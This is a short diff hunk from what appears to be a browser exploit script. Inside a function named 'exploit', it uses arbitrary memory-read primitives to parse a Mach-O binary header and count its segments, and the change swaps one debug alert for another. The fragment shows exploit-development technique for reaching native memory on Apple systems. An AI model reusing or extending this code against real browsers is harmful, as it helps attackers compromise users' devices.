@@ -586,7 +586,7 @@ function exploit(){
         function ab2str(buf) {
   return String.fromCharCode.apply(null, new Uint16Array(buf));
 }
-        alert('Mach-O header' + ab2str(memory.read(hdr,0xf8)))
+        alert('Mach-O magic' + memory.u32(hdr))
         var base_seg = null;
         alert("nsegs test" + memory.read_i32(hdr+0x14))
         var nsegs    = memory.read_i32(hdr+0x14) //memory.u32(Add(hdr, 0x14));
